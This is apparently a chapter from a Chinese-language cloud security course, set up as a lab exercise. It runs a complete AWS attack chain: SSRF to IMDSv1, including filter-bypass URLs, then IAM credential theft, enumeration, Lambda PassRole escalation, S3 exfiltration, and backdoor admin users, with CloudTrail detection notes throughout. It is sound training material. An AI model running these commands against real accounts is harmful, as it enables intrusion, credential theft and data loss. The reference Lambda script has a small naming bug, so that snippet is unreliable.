# 練習 B：完整 Cloud Kill Chain

> **法律警告**
>
> 本練習模擬真實攻擊手法。所有步驟**必須且只能**在你擁有完整授權的實驗環境中執行。
>
> 對任何你未獲得明確書面授權的 AWS 帳號、雲端服務、IP 位址執行以下任何動作，在台灣、美國、歐盟及絕大多數法律管轄區屬於刑事犯罪，可能面臨數年有期徒刑與鉅額罰款。
>
> CloudGoat 授權範圍僅限你自己部署的 Terraform 環境。flaws.cloud 授權範圍僅限 Scott Piper 公開說明的關卡。未獲授權禁止對任何 169.254.169.254 以外實際公司資源發送請求。
>
> **本練習未在真實生產環境實測。所有步驟需在授權環境執行。**

---

## 目標

完整走完一條真實 cloud kill chain（雲端攻擊鏈）：

```
SSRF → IMDSv1 metadata → 竊取 IAM 憑證 → 枚舉 → 提權/橫向移動 → 資料外洩 → 持久化（選）
```

這不是各步驟的孤立練習。重點是讓你親手感受每一跳如何銜接，以及為什麼每一跳在防守方的日誌裡都留下痕跡。

---

## 選擇實驗環境

選一個，二選一即可，不需要全做。

### 選項 A：CloudGoat（Rhino Security Labs）

自行部署，需要 AWS 帳號與 Terraform。使用 `ec2_ssrf` 場景。

```bash
pip install cloudgoat
cloudgoat config profile default   # 指向你的 AWS 帳號
cloudgoat create ec2_ssrf
```

部署完畢後 CloudGoat 會輸出一組起始 URL，那就是你的 SSRF 入口。

**費用**：部署期間約 $1-3 USD，練習完畢立刻銷毀。

```bash
cloudgoat destroy ec2_ssrf
```

### 選項 B：flaws.cloud

Scott Piper 架設的公開故意漏洞實驗室，不需要帳號、不需要部署，直接瀏覽器開啟：

```
http://flaws.cloud
```

Level 1-3 涵蓋 S3 公開存取、IAM 憑證外洩。Level 4-6 需要你有自己的 AWS 帳號接收角色。

**限制**：flaws.cloud 的場景較固定，SSRF→metadata 這條線在 Level 5 才出現，且部分步驟和本練習命令不完全對應。把它當概念驗證用。

### 選項 C：自建最小實驗室

若你想完全掌控環境：

```bash
# 建立一台 EC2（t2.micro，免費額度範圍內）
# 掛一個有 S3 讀取權限的 IAM Role
# 部署一個接受任意 URL 的簡單 Flask 應用當 SSRF 靶
# 在 S3 放一個 flag.txt
# 練習完畢立刻 terminate + 刪除 role
```

詳細建置腳本見本課附錄 A（若已完成）。**費用低於 $5 USD，練習完畢立刻刪除。**

---

## 準備工具

```bash
# 攻擊工具
pip install enumerate-iam boto3
brew install awscli       # 或 apt install awscli

# 可選但推薦
pip install pacu          # Pacu：AWS 後滲透框架（Rhino Security Labs 出品）

# Burp Suite Community（免費）用來觀察 HTTP 請求
```

確認 AWS CLI 基礎設定：

```bash
aws --version
# aws-cli/2.x.x
```

---

## Step 1：偵察（Recon）

### 任務

你只有一條 URL，例如 CloudGoat 給你的：

```
http://34.xx.xx.xx/
```

目標：確認這個 Web 應用存在 SSRF（服務端請求偽造，Server-Side Request Forgery）漏洞，並找到可以注入的參數。

### 執行

先看應用行為：

```bash
curl http://34.xx.xx.xx/
# 通常會看到一個接受 url= 參數的表單或 API
```

測試是否可以讓伺服器替你發出請求（先打一個你控制的伺服器）：

```bash
# 在另一台機器或用 requestbin/webhook.site
curl "http://34.xx.xx.xx/?url=http://your-webhook.site/test"
```

如果 webhook 收到來自 EC2 IP 的請求，SSRF 確認成立。

探測 metadata endpoint（元資料端點）。IMDSv1 不需要任何認證：

```bash
curl "http://34.xx.xx.xx/?url=http://169.254.169.254/"
```

**預期輸出**：

```
latest
```

或

```
1.0
2007-01-19
2007-03-01
...
latest
```

這表示你透過目標 EC2 向 IMDSv1 拿到了 metadata 根目錄。

### 機制說明

`169.254.169.254` 是 AWS 保留的 link-local（連結本地）位址，只有 EC2 實例本身能直接存取。外部網路無法路由到這個位址。SSRF 讓你把目標 EC2 當成代理，借道存取這個只有它看得見的端點。

IMDSv1（Instance Metadata Service version 1）不需要 header、不需要 token，任何 HTTP GET 都能讀。這是它致命的設計缺陷。IMDSv2 要求先 PUT 一個 TTL token 才能 GET，但大量舊機器仍在跑 IMDSv1。

### CloudTrail 會記錄什麼

**這個步驟不會在 CloudTrail 留下任何紀錄。**

對 `169.254.169.254` 的請求是實例內部行為，不走 AWS API。這是 IMDSv1 最危險的特性之一：攻擊者拿到憑證之前幾乎隱形。

### 失敗情況

```
curl: (7) Failed to connect to 34.xx.xx.xx
```
→ 確認 EC2 安全群組（Security Group）的 inbound rule 有沒有開 80 port 給你的 IP。

```
{"error": "Invalid URL"}
```
→ 應用程式有做 URL 白名單，這個 SSRF 沒那麼直接。嘗試 bypass：`http://169.254.169.254.nip.io/`、`http://[::ffff:169.254.169.254]/`、`http://0xa9fea9fe/`（十六進位）。

---

## Step 2：打 Metadata Endpoint，竊取 IAM 憑證（Credential Theft via SSRF）

### 任務

透過 SSRF 逐層深入 metadata，拿到 IAM 角色（IAM Role）的臨時憑證（temporary credentials）。

### 執行

列出 IAM 角色名稱：

```bash
curl "http://34.xx.xx.xx/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**預期輸出**（角色名稱）：

```
cg-ec2-role-ec2_ssrf_cgidXXXXXX
```

記下這個角色名稱，用它拿完整憑證：

```bash
curl "http://34.xx.xx.xx/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-ec2_ssrf_cgidXXXXXX"
```

**預期輸出**：

```json
{
  "Code" : "Success",
  "LastUpdated" : "2026-08-01T10:00:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXXXXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token" : "IQoJb3JpZ2luX2VjEA...（很長的 Session Token）",
  "Expiration" : "2026-08-01T16:00:00Z"
}
```

把憑證導出到本地環境：

```bash
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEA..."
export AWS_DEFAULT_REGION="us-east-1"
```

### 機制說明

EC2 附掛 IAM Role 的方式是：AWS 每幾分鐘把臨時憑證寫進 IMDS，讓 EC2 上的程式透過 169.254.169.254 自取。臨時憑證有效期通常 1-6 小時，過期後 AWS 自動輪換。

`AccessKeyId` 開頭是 `ASIA` 表示這是 STS 臨時憑證（相對於長期的 `AKIA` 開頭）。你拿到的是**被盜憑證**——功能和真正的 EC2 程式完全相同，但你在外部使用。

Token 欄位（`AWS_SESSION_TOKEN`）是 STS 簽發的 session token，忘記設定這個 env var 就會看到：

```
InvalidClientTokenId: The security token included in the request is invalid.
```

### CloudTrail 會記錄什麼

**憑證本身的取得不記錄**（同 Step 1，IMDS 不進 CloudTrail）。

但你**使用**這組憑證的第一個 AWS API 呼叫就會開始留下紀錄，包含：

```json
{
  "userIdentity": {
    "type": "AssumedRole",
    "principalId": "AROAXXX:i-0xxxxx",
    "arn": "arn:aws:sts::123456789012:assumed-role/cg-ec2-role.../i-0xxxxx"
  },
  "sourceIPAddress": "你的外部IP",
  "userAgent": "aws-cli/2.x.x"
}
```

注意 `sourceIPAddress`：正常情況下這個角色的請求來源 IP 應該是 EC2 的 IP，突然出現外部 IP 是明顯異常信號。

---

## Step 3：枚舉（IAM Enumeration）

### 任務

用竊取的憑證確認身份，然後系統性地枚舉我們有哪些權限、哪些資源存在。

### 執行

確認身份（最重要的第一步）：

```bash
aws sts get-caller-identity
```

**預期輸出**：

```json
{
  "UserId": "AROAXXX:i-0abcdef1234567890",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/cg-ec2-role-ec2_ssrf_cgidXXXXXX/i-0abcdef1234567890"
}
```

這告訴我們：我們在帳號 `123456789012` 裡，身份是 EC2 role 的 assumed role session。

使用 enumerate-iam 工具進行系統性枚舉：

```bash
# enumerate-iam 會並發測試數百個 IAM 動作，找出哪些不回傳 AccessDenied
enumerate-iam --access-key $AWS_ACCESS_KEY_ID \
              --secret-key $AWS_SECRET_ACCESS_KEY \
              --session-token $AWS_SESSION_TOKEN \
              --region us-east-1
```

若不想安裝工具，手動枚舉核心服務：

```bash
# 列出所有 IAM User
aws iam list-users 2>&1

# 列出所有 IAM Role
aws iam list-roles 2>&1

# 列出所有 S3 Bucket
aws s3 ls 2>&1

# 列出 EC2 實例
aws ec2 describe-instances --region us-east-1 2>&1

# 列出 Lambda 函數
aws lambda list-functions --region us-east-1 2>&1

# 列出 Secrets Manager 的 secret
aws secretsmanager list-secrets --region us-east-1 2>&1
```

記錄哪些指令成功（不回傳 AccessDenied），哪些失敗。失敗不代表資源不存在，只代表這個身份沒有 list 權限——有時候 get 權限有但 list 沒有。

找到 S3 bucket 名稱後，探測內容：

```bash
# 假設 ls 回傳了 cg-secret-s3-bucket-cgidXXXXXX
aws s3 ls s3://cg-secret-s3-bucket-cgidXXXXXX/
```

**預期輸出**：

```
2026-08-01 10:00:00       1234 admin_credentials.txt
2026-08-01 10:00:00        256 flag.txt
2026-08-01 10:00:00      45678 db_backup.sql.gz
```

### 機制說明

`sts:GetCallerIdentity` 是 AWS 裡少數**任何有效憑證都能呼叫**的 API，就算 IAM Policy 寫了 Deny All 也擋不住這個動作。這是攻擊者確認憑證有效的標準第一步。

enumerate-iam 的原理是暴力測試——對每個 AWS API 動作都呼叫一次，根據是否回傳 `AccessDenied` 判斷有無權限。這比手動快 100 倍，但也會在 CloudTrail 裡留下大量密集的 API 呼叫紀錄。

### CloudTrail 會記錄什麼

enumerate-iam 跑完會在 CloudTrail 留下數百到數千筆 API 呼叫，短時間內來自同一個 principalId，這是 GuardDuty 的標準告警觸發條件之一：

```
Finding: UnauthorizedAccess:IAMUser/TorIPCaller
Finding: Recon:IAMUser/MaliciousIPCaller
Finding: Discovery:S3/MaliciousIPCaller
```

手動枚舉雖然慢，但密度低，比較不容易觸發速率異常偵測。

---

## Step 4：提權或橫向移動（Privilege Escalation / Lateral Movement）

### 任務

EC2 role 通常不是最高權限角色。嘗試借用 PassRole + Lambda 的提權路徑，或假設（assume）另一個更有權限的 IAM Role。

### 執行：路徑 A — 嘗試 iam:PassRole + lambda:CreateFunction

```bash
# 確認我們有沒有 PassRole 權限
aws iam list-attached-role-policies \
  --role-name cg-ec2-role-ec2_ssrf_cgidXXXXXX 2>&1

# 看我們能不能 PassRole 給 Lambda
aws iam list-roles --query 'Roles[?contains(RoleName, `lambda`)]' 2>&1
```

如果找到一個有 `AdministratorAccess` 的 Lambda 執行角色，建立惡意 Lambda 函數：

```python
# evil.py - 上傳給 Lambda 的 payload
import boto3
import json

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    iam = boto3.client('iam')
    # 用 admin role 列出所有 bucket
    buckets = s3.list_buckets()
    users = iam.list_users()
    return {
        'buckets': [b['Name'] for b in buckets['Buckets']],
        'users': [u['UserName'] for u in users['Users']]
    }
```

```bash
zip evil.zip evil.py

aws lambda create-function \
  --function-name evil-recon \
  --runtime python3.12 \
  --handler evil.lambda_handler \
  --zip-file fileb://evil.zip \
  --role arn:aws:iam::123456789012:role/cg-lambda-role-admin-cgidXXXXXX

aws lambda invoke \
  --function-name evil-recon \
  --payload '{}' \
  output.json

cat output.json
```

### 執行：路徑 B — STS AssumeRole 橫向移動

```bash
# 找出環境中的 Role ARN
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table 2>&1

# 嘗試 assume 一個不同的 role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/cg-lambda-role-admin-cgidXXXXXX \
  --role-session-name recon-session \
  2>&1
```

如果成功，輸出會包含新的臨時憑證三件組。更新環境變數，切換到新身份：

```bash
export AWS_ACCESS_KEY_ID="ASIAYYYY..."
export AWS_SECRET_ACCESS_KEY="yyyyyyyy..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2lu..."

# 確認新身份
aws sts get-caller-identity
```

### 機制說明

PassRole + CreateFunction 提權路徑（見 Ch 7）的核心邏輯：我沒有 admin 權限，但我有權限建立一個 Lambda，並把 admin role「傳給」它。Lambda 執行時用的是 admin role，我叫它做任何事都等同我自己有 admin 權限。

AssumeRole 橫向移動的前提是目標 Role 的 Trust Policy（信任政策）允許當前身份 assume。攻擊者在拿到一個 Role 後的習慣動作是把所有 Role 的 Trust Policy 都查一遍——這是枚舉步驟裡容易被忽略的部分。

### CloudTrail 記錄

```json
{
  "eventName": "CreateFunction",
  "requestParameters": {
    "functionName": "evil-recon",
    "role": "arn:aws:iam::123456789012:role/cg-lambda-role-admin..."
  }
}

{
  "eventName": "AssumeRole",
  "requestParameters": {
    "roleArn": "arn:aws:iam::123456789012:role/cg-lambda-role-admin...",
    "roleSessionName": "recon-session"
  }
}
```

`AssumeRole` 事件同時出現在**來源帳號**和**目標帳號**的 CloudTrail，這讓它在跨帳號場景下特別容易被察覺。

---

## Step 5：存取 S3 資料（Data Access / Exfiltration）

### 任務

用當前最高權限身份找到並下載敏感資料。

### 執行

列出所有 S3 bucket：

```bash
aws s3 ls
```

**預期輸出**：

```
2026-08-01 10:00:00 cg-secret-s3-bucket-cgidXXXXXX
2026-08-01 10:00:00 cg-logs-bucket-cgidXXXXXX
```

探索 secret bucket 內容：

```bash
aws s3 ls s3://cg-secret-s3-bucket-cgidXXXXXX/ --recursive
```

**預期輸出**：

```
2026-08-01 10:00:00       1234 admin_credentials.txt
2026-08-01 10:00:00        256 flag.txt
2026-08-01 10:00:00      45678 db_backup.sql.gz
2026-08-01 10:00:00       8192 internal_config.yaml
```

下載 flag（目標確認）：

```bash
aws s3 cp s3://cg-secret-s3-bucket-cgidXXXXXX/flag.txt ./flag.txt
cat flag.txt
```

下載所有敏感資料（模擬大規模外洩）：

```bash
aws s3 sync s3://cg-secret-s3-bucket-cgidXXXXXX/ ./exfil/
ls -la exfil/
```

查看 bucket 的存取控制設定，理解為何我們能讀：

```bash
# 看 Bucket Policy
aws s3api get-bucket-policy \
  --bucket cg-secret-s3-bucket-cgidXXXXXX \
  --output text | python3 -m json.tool

# 看 ACL
aws s3api get-bucket-acl \
  --bucket cg-secret-s3-bucket-cgidXXXXXX
```

### 機制說明

`s3:GetObject` 和 `s3:ListBucket` 是兩個獨立的 IAM 動作。你可能有 GetObject 但沒有 ListBucket（知道 key 才能下載，但不能列目錄），或反過來。攻擊者習慣兩個都試。

`aws s3 sync` 在底層會發出大量 `GetObject` 請求。如果 bucket 有幾百 GB，這個動作幾乎不可能不觸發 CloudTrail 告警，因為流量圖會出現劇烈峰值。實際 APT 會挑夜間或分批下載。

### CloudTrail 記錄

```json
{
  "eventSource": "s3.amazonaws.com",
  "eventName": "GetObject",
  "requestParameters": {
    "bucketName": "cg-secret-s3-bucket-cgidXXXXXX",
    "key": "flag.txt"
  },
  "sourceIPAddress": "你的外部IP"
}
```

S3 的 object-level logging 需要**額外開啟** Data Events（預設關閉，因為費用高）。若 Data Events 沒開，`GetObject` 不進 CloudTrail——這是防守方另一個常被忽略的盲點。

---

## Step 6：持久化（選做）

### 任務

在環境裡留下後門，讓憑證被輪換後我們仍能回來。

> **警告**：這個步驟在 CloudGoat 環境執行後，請務必執行 `cloudgoat destroy` 確保所有資源刪除。在 flaws.cloud 不要執行這個步驟。

### 方法 A：建立額外 IAM Access Key

```bash
# 找一個現有的 IAM User
aws iam list-users --query 'Users[*].UserName' --output text

# 為那個 User 建立額外 Access Key
aws iam create-access-key --user-name target-user
```

**預期輸出**：

```json
{
  "AccessKey": {
    "UserName": "target-user",
    "AccessKeyId": "AKIAZZZZ...",
    "Status": "Active",
    "SecretAccessKey": "zzzzzzzz...",
    "CreateDate": "2026-08-01T12:00:00Z"
  }
}
```

這組 `AKIA` 開頭的長期 Access Key 不會因為 EC2 重啟或角色輪換而失效。

### 方法 B：建立 Shadow IAM User

```bash
# 建立新的隱藏帳號
aws iam create-user --user-name backup-svc-account

# 給予高權限
aws iam attach-user-policy \
  --user-name backup-svc-account \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 建立 Access Key
aws iam create-access-key --user-name backup-svc-account
```

### 方法 C：EventBridge 排程（理論）

真實 APT 會設定 EventBridge Rule 定期觸發 Lambda，Lambda 每小時把環境資訊回傳給 C2。這在 CloudTrail 裡的特徵是新出現的 EventBridge Rule，但若同時把 Rule 建在一個防守方不太監控的 region（如 ap-southeast-3），往往能存活很久。

```bash
# 僅供理解，不需要實際執行
aws events put-rule \
  --name "backup-maintenance" \
  --schedule-expression "rate(1 hour)" \
  --state ENABLED \
  --region ap-southeast-3
```

### CloudTrail 記錄

```json
{
  "eventName": "CreateAccessKey",
  "requestParameters": {
    "userName": "target-user"
  }
}

{
  "eventName": "CreateUser",
  "requestParameters": {
    "userName": "backup-svc-account"
  }
}

{
  "eventName": "AttachUserPolicy",
  "requestParameters": {
    "userName": "backup-svc-account",
    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  }
}
```

IAM 事件是 Management Events，預設進 CloudTrail。但防守方通常只有在 GuardDuty 告警後才去翻日誌，這表示告警→調查存在時間差，持久化機制有可能在那段時間紮根。

---

## Kill Chain 總結

| 步驟 | 攻擊動作 | 機制 | CloudTrail |
|------|----------|------|------------|
| Step 1 | SSRF 探測 IMDSv1 | link-local，不需認證 | 無紀錄 |
| Step 2 | 竊取 IAM 臨時憑證 | IMDS 回傳 STS token | 無紀錄 |
| Step 3 | 枚舉權限與資源 | AWS API 呼叫 | 全部記錄，密集告警 |
| Step 4 | 提權 / 橫向移動 | PassRole / AssumeRole | CreateFunction, AssumeRole |
| Step 5 | S3 資料外洩 | GetObject, sync | 需開 Data Events |
| Step 6 | 持久化後門 | 建立 User / Key | CreateUser, AttachPolicy |

**整條鏈的盲點**：攻擊者從 SSRF 到竊取憑證完全不留痕跡。防守方第一個能看到的事件是 Step 3 的枚舉，但那時憑證已經被拿走了。這是為什麼防守的重點不是「等日誌出現再告警」，而是從源頭阻止 IMDSv1（強制 IMDSv2）和 SSRF 漏洞進入生產環境。

---

## 參考解法

<details>
<summary>Step 2 完整 curl 指令（含 JSON 解析）</summary>

```bash
# 一次拿完整憑證並自動 export
ROLE=$(curl -s "http://TARGET_IP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")

CREDS=$(curl -s "http://TARGET_IP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}")

export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Token'])")

echo "Loaded credentials for role: $ROLE"
echo "Access Key: $AWS_ACCESS_KEY_ID"
aws sts get-caller-identity
```

</details>

<details>
<summary>Step 3 enumerate-iam 完整輸出範例</summary>

```
[+] Attempting common-service APIs across 200+ actions...
[*] Skipping failed actions (AccessDenied)...
[+] -- s3:ListBuckets
[+] -- sts:GetCallerIdentity
[+] -- ec2:DescribeInstances
[+] -- iam:GetUser
[+] -- iam:ListRoles
[+] -- lambda:ListFunctions
[-] iam:CreateUser - AccessDenied
[-] iam:AttachUserPolicy - AccessDenied
[-] iam:CreateRole - AccessDenied
[*] 6 permissions found. 194 denied.
```

</details>

<details>
<summary>Step 4 Lambda 提權完整流程</summary>

```bash
# 1. 確認有 lambda:CreateFunction 和 iam:PassRole
aws iam simulate-principal-policy \
  --policy-source-arn "$(aws sts get-caller-identity --query Arn --output text)" \
  --action-names lambda:CreateFunction iam:PassRole \
  --resource-arns "*"

# 2. 找 admin Lambda role
LAMBDA_ROLE=$(aws iam list-roles \
  --query 'Roles[?contains(RoleName, `lambda`) && contains(RoleName, `admin`)].Arn' \
  --output text)

# 3. 建立 payload
cat > evil.py << 'EOF'
import boto3, json

def lambda_handler(event, context):
    results = {}
    try:
        results['users'] = boto3.client('iam').list_users()['Users']
    except Exception as e:
        results['iam_error'] = str(e)
    try:
        results['buckets'] = boto3.client('s3').list_buckets()['Buckets']
    except Exception as e:
        results['s3_error'] = str(e)
    return results
EOF

zip evil.zip evil.py

# 4. 部署
aws lambda create-function \
  --function-name evil-recon-$(date +%s) \
  --runtime python3.12 \
  --handler evil.lambda_handler \
  --zip-file fileb://evil.zip \
  --role $LAMBDA_ROLE

# 5. 執行
aws lambda invoke \
  --function-name evil-recon-$(date +%s) \
  --payload '{}' \
  /tmp/result.json

cat /tmp/result.json | python3 -m json.tool
```

</details>

<details>
<summary>flaws.cloud 對應關卡說明</summary>

如果你選擇 flaws.cloud，kill chain 的對應是：

- **Level 1**：S3 bucket 開放匿名讀取 → 對應 Step 5 的「不需憑證就能讀 S3」
- **Level 2**：S3 bucket 允許任何 AWS 帳號讀取（只需要有效 AWS 帳號）→ 枚舉概念
- **Level 3**：.git 目錄外洩 IAM Access Key → 對應 Step 2 的「憑證竊取」不同路徑
- **Level 4**：用竊取的 EC2 snapshot 找 credential → 橫向移動概念
- **Level 5**：SSRF via EC2 magic IP → 最接近本練習 Step 1+2 的場景

建議先在 CloudGoat 完整跑完 Kill Chain，再用 flaws.cloud 驗證你對每個機制的理解。

</details>

---

## 測試關卡（Checkpoints）

完成每個 Step 後確認以下輸出：

**Step 1**
```bash
# 這個指令應該回傳 "latest" 或 AWS metadata 目錄
curl "http://TARGET_IP/?url=http://169.254.169.254/"
```
預期：非空白輸出，非 connection refused

**Step 2**
```bash
# 這個指令應該回傳 JSON，包含 AccessKeyId
curl "http://TARGET_IP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
```
預期：JSON 包含 `"Code": "Success"`

**Step 3**
```bash
aws sts get-caller-identity
```
預期：JSON 包含 `Account` 欄位，無報錯

**Step 4**（路徑 B）
```bash
# assume role 成功後
aws sts get-caller-identity
```
預期：Arn 換成新的 role name，不同於 Step 3

**Step 5**
```bash
cat flag.txt
```
預期：flag 字串，格式通常是 `FLAG{...}` 或 CloudGoat 給的 challenge key

---

## 自我檢核

完成練習後，確認你能回答以下問題：

- [ ] IMDSv1 和 IMDSv2 的根本差異是什麼？為什麼 v2 能阻擋這條 kill chain？
- [ ] `ASIA` 開頭和 `AKIA` 開頭的 Access Key 差異在哪？攻擊者偏好哪種？為什麼？
- [ ] CloudTrail 的 Management Events 和 Data Events 有什麼不同？本練習的 Step 5 為什麼可能不被記錄？
- [ ] 如果我是防守方，我會在哪個 Step 最早收到告警？我能在 Step 2 之前就偵測到攻擊嗎？
- [ ] enumerate-iam 的操作在 CloudTrail 裡看起來像什麼？如何用 AWS Athena 查詢這種行為？
- [ ] 完成 Step 5 後，你能解釋 bucket policy 和 IAM policy 哪個優先生效嗎？

---

## 清理

練習結束後立刻清理，不要讓 CloudGoat 環境繼續運行：

```bash
# 如果建了 Lambda
aws lambda delete-function --function-name evil-recon

# 如果建了 IAM User
aws iam detach-user-policy \
  --user-name backup-svc-account \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-access-key --user-name backup-svc-account --access-key-id AKIAZZZZ...
aws iam delete-user --user-name backup-svc-account

# 銷毀整個 CloudGoat 環境
cloudgoat destroy ec2_ssrf

# 確認沒有殘留資源
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name]' --output table
aws iam list-users --query 'Users[*].UserName' --output table
aws s3 ls
```

---

- 上一章：[第 15 章 — 日誌與偵測規避](15-logging-evasion.md)
- 下一章：[第 16 章 — 容器隔離的安全模型](16-container-isolation-model.md)
